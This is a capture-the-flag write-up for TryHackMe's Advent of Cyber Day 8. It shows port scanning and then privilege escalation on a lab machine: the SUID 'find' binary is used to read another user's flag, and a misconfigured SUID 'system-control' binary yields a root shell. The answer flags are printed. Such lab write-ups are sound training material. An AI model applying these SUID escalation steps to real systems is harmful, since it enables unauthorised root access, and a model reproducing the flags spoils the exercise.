# TryHackMe [Advent of Cyber 1](https://tryhackme.com/room/25daysofchristmas) Day 8
### References
* MuirlandOracle. (2020, January 6). MuirlandOracle. MuirlandOracle’s Blog. https://muirlandoracle.co.uk/2020/01/06/tryhackme-christmas-2019-challenge-write-up/
## What port is SSH running on?
```bash
$ nmap -sV -p 10000- 10.10.234.200
PORT      STATE SERVICE REASON  VERSION
65534/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```
**Answer**: `65534`
## Find and run a file as `igor`. Read the file `/home/igor/flag1.txt`.
```bash
$ ssh holly@10.10.234.200 -p 65534
holly@ip-10-10-234-200:~$ ls -l /usr/bin/find
-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 /usr/bin/find
holly@ip-10-10-234-200:~$ find /home/igor/flag1.txt -exec cat /home/igor/flag1.txt \;
THM{d3f0708bdd9accda7f937d013eaf2cd8}
```
**Flag 1**: `THM{d3f0708bdd9accda7f937d013eaf2cd8}`
## Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the `/root/flag2.txt` file?
1. Find SUID binaries:
```bash
holly@ip-10-10-234-200:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null | grep "/bin"
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 27608 Aug 23  2019 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 Aug 23  2019 /bin/mount
-rwsr-xr-x 1 root root 40152 May 15  2019 /snap/core/7396/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7396/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7396/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7396/bin/su
-rwsr-xr-x 1 root root 27608 May 15  2019 /snap/core/7396/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7396/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7396/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7396/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7396/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7396/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jun 10  2019 /snap/core/7396/usr/bin/sudo
-rwsrwxr-x 1 root root 8880 Dec  7  2019 /usr/bin/system-control
-rwsr-xr-x 1 root root 32944 Mar 26  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 39904 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 136808 Jun 10  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 71824 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 75304 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 32944 Mar 26  2019 /usr/bin/newgidmap
```
2. Use `system-control` to gain root access from a `bash` shell:
```bash
holly@ip-10-10-234-200:~$ system-control

===== System Control Binary =====

Enter system command: /bin/bash
root@ip-10-10-234-200:~# cat /root/flag2.txt
THM{8c8211826239d849fa8d6df03749c3a2}
```

**Flag 2**: `THM{8c8211826239d849fa8d6df03749c3a2}`